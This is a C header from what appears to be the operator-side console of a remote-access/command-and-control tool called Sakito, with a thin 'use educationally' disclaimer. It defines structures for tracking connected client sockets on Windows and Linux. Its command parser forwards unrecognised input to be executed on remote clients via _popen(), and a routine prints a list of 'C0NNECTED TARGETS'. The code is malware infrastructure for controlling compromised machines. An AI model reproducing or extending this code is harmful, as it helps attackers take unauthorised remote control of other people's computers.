/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#ifndef SAKITO_SERVER_TOOLS_H
#define SAKITO_SERVER_TOOLS_H

#define BACKGROUND_CLIENT -100
#define FILE_NOT_FOUND 1

#if defined(_WIN32) || defined(_WIN64) || (defined(__CYGWIN__) && !defined(_WIN32))
	// Typedef for function pointer.
	typedef int (*server_func)(char*, size_t, SOCKET);

	typedef struct {
		// Client hostname.
		char* host;

		// Client socket.
		SOCKET sock;

	} Conn;

	typedef struct {
		// Mutex object for race condition checks.
		HANDLE ghMutex;

		// Server buffer.
		char buf[BUFLEN + 1];

		// Thread handle for handling execution/termination of accept_conns thread.
		HANDLE acp_thread;

		// Server socket for accepting connections.
		SOCKET listen_socket;

		// Array of Conn objects/structures.
		Conn* clients;

		// Memory blocks allocated.
		size_t clients_alloc;

		// Amount of memory used.
		size_t clients_sz;

	} Server_map;
#elif defined(__linux__)
	#define SOCKET_ERROR -1
	// Typedef for function pointer for server functions.
	typedef int (*server_func)(char*, size_t, int);

	typedef struct {
		// Client hostname.
		char* host;

		// Client socket.
		int sock;

	} Conn;

	typedef struct {
		// Server buffer.
		char buf[BUFLEN + 1];

		// Server socket for accepting connections.
		int listen_socket;

		// Pthread object for handling execution/termination of accept_conns thread.
		pthread_t acp_thread;

		// Flag for race condition checks.
		int THRD_FLAG;

		// Array of Conn objects/structures.
		Conn* clients;

		// Memory blocks allocated.
		size_t clients_alloc;

		// Amount of memory used.
		size_t clients_sz;

	} Server_map;
#endif

typedef void (*console_func)(Server_map *s_map);

// Function to compare two strings (combined logic of strcmp and strncmp).
int compare(const char* buf, const char* str) {
	for (int j = 0; str[j] != '\0'; j++)
		if (str[j] != buf[j])
			return 0;

	return 1;
}

// Function to read/store stdin in buffer until \n is detected.
void get_line(char* const buf, size_t *cmd_len) {
	char c;

	while ((c = getchar()) != '\n' && *cmd_len < BUFLEN)
		buf[(*cmd_len)++] = c;
}

// Function to return function pointer based on parsed command.
void* parse_cmd(char* const buf, size_t* cmd_len, int cmds_len, const char commands[5][11], void** func_array, void* default_func) {
	get_line(buf, cmd_len);

	if (*cmd_len > 1)
		// Parse stdin string and return its corresponding function pointer.
		for (int i = 0; i < cmds_len; i++)
			if (compare(buf, commands[i]))
				return func_array[i];

	// If no command was parsed: send/execute the command string on the client via _popen().
	return default_func;
}

// Function to list/print all available connections to stdout.
void list_connections(Server_map* s_map) {
	printf("\n\n---------------------------\n");
	printf("---  C0NNECTED TARGETS  ---\n");
	printf("--     Hostname: ID      --\n");
	printf("---------------------------\n\n");

	if (s_map->clients_sz) {
		for (size_t i = 0; i < s_map->clients_sz; i++)
			printf("%s: %lu\n", s_map->clients[i].host, i);
		printf("\n\n");
	}
	else {
		printf("No connected targets available.\n\n\n");
	}
}

#endif
